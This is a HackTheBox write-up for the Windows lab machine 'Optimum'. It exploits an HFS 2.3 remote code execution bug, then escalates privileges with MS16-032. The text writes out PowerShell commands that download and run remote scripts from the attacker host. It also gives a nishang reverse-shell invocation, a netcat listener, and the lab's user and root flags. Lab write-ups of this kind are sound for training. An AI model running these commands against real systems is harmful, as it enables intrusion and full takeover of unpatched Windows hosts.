---
title: HackTheBox - Optimum
date: 2021-01-07 02:24:42 +0100
categories: [Hackthebox walkthroughs, Windows, Easy]
tags: [htb-windows-easy, HttpFileServer, HFS, metasploit, meterpreter, suggester, searchsploit, RCE, tcpdump, nishang, powershell, Sherlock, Watson, Windows-Exploit-Suggester, wesng, CVE-2016-0099, MS16-032, Empire, writeup, oscp-prep]
image: https://amirr0r.github.io/assets/img/htb/machines/windows/easy/optimum/Optimum.png
---

## Foothold

### `nmap` scan

```bash
$ nmap -min-rate 5000 --max-retries 1 -sV -sC -p- -oN Optimum-full-port-scan.txt 10.10.10.8
Nmap scan report for 10.10.10.8
Host is up (0.15s latency).
Not shown: 65534 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-title: HFS /
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

### HttpFileServer/2.3 (port 80)

![HFS main page](https://amirr0r.github.io/assets/img/htb/machines/windows/easy/optimum/80-HFS.png)

#### `gobuster`

![gobuster](https://amirr0r.github.io/assets/img/htb/machines/windows/easy/optimum/80-gobuster.png)
___

## Method #1: using Metasploit (failed)

![metasploit search HFS](https://amirr0r.github.io/assets/img/htb/machines/windows/easy/optimum/MSF-search.png)

![](https://amirr0r.github.io/assets/img/htb/machines/windows/easy/optimum/MSF-info.png)

### Inspecting payload with Burp

![metasploit HFS exploit options](https://amirr0r.github.io/assets/img/htb/machines/windows/easy/optimum/MSF-options.png)

The exploit seems to save a visual basic script (`.vbs`) on the target. We press "Forward" button (top left) to go further:

![Burp payload 1](https://amirr0r.github.io/assets/img/htb/machines/windows/easy/optimum/MSF-BURP-1.png)

Now it execute the malicious script. We press "Forward" again:

![Burp payload 2](https://amirr0r.github.io/assets/img/htb/machines/windows/easy/optimum/MSF-BURP-2.png)

It worked! We got a **meterppreter** as user `kostas`:

![meterpreter session](https://amirr0r.github.io/assets/img/htb/machines/windows/easy/optimum/MSF-SUCCESS.png)

### Downloading winPEAS

1. Download [winPEAS.exe](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/winPEAS/winPEASexe/winPEAS/bin/x64/Release/winPEAS.exe) (64 bits version)

2. On our machine we run an HTTP Server:

```bash
python3 -m http.server
```

3. From victim's target, go to a world-writeable directory (`c:\Windows\System32\spool\drivers\color>`) and download `winPEAS.exe`: 

```powershell
powershell -command "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.14:8000/winPEAS.exe', 'c:\Windows\System32\spool\drivers\color\winPEAS.exe')"
```

Unfortunately, I didn't find anything interesting in **winPEAS** output.

Therefore, I decided to use **metasploit suggester** &darr;

### Exploit Suggester

Running `sysinfo` within our **meterpreter** session shows us an issue. We're facing a Windows with a 64-bit architecture while our meterpreter is 32 bit (x86):

![meterpreter sysinfo](https://amirr0r.github.io/assets/img/htb/machines/windows/easy/optimum/MSF-sysinfo.png)

#### x86

If we use **metasploit suggester** anyway:

![MSF suggester x86](https://amirr0r.github.io/assets/img/htb/machines/windows/easy/optimum/MSF-suggest-x86.png)

#### Migrate (x86 &rarr; x64)

In order to fix this, we can open a shell our **meterpreter** session and then use the `migrate` command:

![meterpreter migrate](https://amirr0r.github.io/assets/img/htb/machines/windows/easy/optimum/MSF-migrate.png)

#### x64

Now we can use suggester:

![MSF suggester x64](https://amirr0r.github.io/assets/img/htb/machines/windows/easy/optimum/MSF-suggest.png)

No exploits were suggested.

## Method #2: without Metasploit 

First, since our [`nmap` scan](#nmap-scan) identified that the target is running **HttpFileServer** (HFS) version **2.3**, and considering that `gobuster` didn't find any thing, let's search for exploits:

![searchsploit HttpFileServer](https://amirr0r.github.io/assets/img/htb/machines/windows/easy/optimum/searchsploit-1.png)

It's interesting to notice that looking for `HFS 2.3` gives us more results:

![searchsploit HFS](https://amirr0r.github.io/assets/img/htb/machines/windows/easy/optimum/searchsploit-2.png)

However, let's take a look at the first one:

![download first exploit](https://amirr0r.github.io/assets/img/htb/machines/windows/easy/optimum/searchsploit-m.png)

![exploit source code](https://amirr0r.github.io/assets/img/htb/machines/windows/easy/optimum/RCE.png)

Okay so it's a very simple RCE:

![testing with ping](https://amirr0r.github.io/assets/img/htb/machines/windows/easy/optimum/ping.png)

We can see that the `ping` worked, now we can ask ourselves: _how to get a reverse shell?_ 

### Reverse shell

I tried to use this [one-line powershell reverse shell](https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3) but I couldn't make it works.

So I used the one from [nishang](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) repository (`Invoke-PowerShellTcp.ps1`). We simply add the following line to the script:

```powershell
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.14 -Port 1234
```

> Don't forget to run a listener `nc -lnvp 1234`

Using the exploit (49125.py) example, we can make the target download and execute this reverse shell file by doing so:

```bash
$ python3 49125.py $TARGET 80 "c:\windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.14:8000/Invoke-PowerShellTcp.ps1')"
```

![](https://amirr0r.github.io/assets/img/htb/machines/windows/easy/optimum//Invoke-Powersehll.png)

> **NOTE**: `c:\windows\SysNative\` is a folder specific to 64-bit Windows while `c:\windows\System32\` and `c:\windows\SysWow64\` are both 32-bit Windows folders.

Now we got a shell:

![kostas reverse shell](https://amirr0r.github.io/assets/img/htb/machines/windows/easy/optimum/reverse-shell.png)

### User (kostas)

```powershell
PS C:\Users\kostas\Desktop> type user.txt.txt
d0c39409d7b994a9a1389ebf38ef5f73
```

### Windows Exploit Suggester - Next Generation (WES-NG)

Neither [Sherlock](https://github.com/rasta-mouse/Sherlock), [Watson](https://github.com/rasta-mouse/Watson#watson) and [Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester) worked for me.

However, [wesng](https://github.com/bitsadmin/wesng) (Windows Exploit Suggester Next Generation) helped to find some exploits.

I simply had to save `systeminfo` output into a file and gave it as an argument:

![systeminfo](https://amirr0r.github.io/assets/img/htb/machines/windows/easy/optimum/systeminfo.png)

The target machine is **Windows Server 2012 R2 Standard** version **6.3.9600**. It's a 64 bit machine and many patches have been installed as we see _"31 Hotfix(s) Installed"_. 

![wesng](https://amirr0r.github.io/assets/img/htb/machines/windows/easy/optimum/wesng.png)

I was interested in **CVE-2016-0099** because of the [Empire](https://github.com/EmpireProject/Empire) exploit &rarr; `Invoke-MS16032.ps1`.

It appears that the target is vulnerable:

![CVE-2016-0099](https://amirr0r.github.io/assets/img/htb/machines/windows/easy/optimum/CVE.png)

### Privesc

We have to add this line to `Invoke-MS16032.ps1`:

```powershell
Invoke-MS16032 -Command "iex(New-Object Net.WebClient).DownloadString('http://10.10.14.14:8000/shell.ps1')"
```

The script `shell.ps1` is just a copy of the nishang `Invoke-PowerShellTcp.ps1` script we previously modified. The only difference is the port on which we are redirecting the shell: 

![diff between shell.ps1 and Invoke-PowerShellTcp.ps1](https://amirr0r.github.io/assets/img/htb/machines/windows/easy/optimum/shell-script.png)

Go back to our windows reverse shell, download and execute `Invoke-MS16032.ps1` by doing so:

```powershell
 iex(New-Object Net.WebClient).DownloadString('http://10.10.14.14:8000/Invoke-MS16032.ps1')
```

![MS16032](https://amirr0r.github.io/assets/img/htb/machines/windows/easy/optimum/MS16032.png)

Wait for the scripts to be downloaded and executed:

![scripts downloaded](https://amirr0r.github.io/assets/img/htb/machines/windows/easy/optimum/http-server-ps1.png)

YES! We have access to SYSTEM shell:

![system](https://amirr0r.github.io/assets/img/htb/machines/windows/easy/optimum/system.png)

```powershell
PS C:\users\Administrator\Desktop> type root.txt
51ed1b36553c8461f4552c2e92b3eeed
```
___

## Useful links

- [HFS scripting_commands](https://www.rejetto.com/wiki/index.php/HFS:_scripting_commands)
- [one liner powershell reverse shell](https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3)
- [CVE-2016-0099](https://nvd.nist.gov/vuln/detail/CVE-2016-0099)
- [MS16-032](https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2016/MS16-032)
- [Sherlock](https://github.com/rasta-mouse/Sherlock)
- [Watson](https://github.com/rasta-mouse/Watson#watson)
- [Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [wesng](https://github.com/bitsadmin/wesng)
- [Empire](https://github.com/EmpireProject/Empire)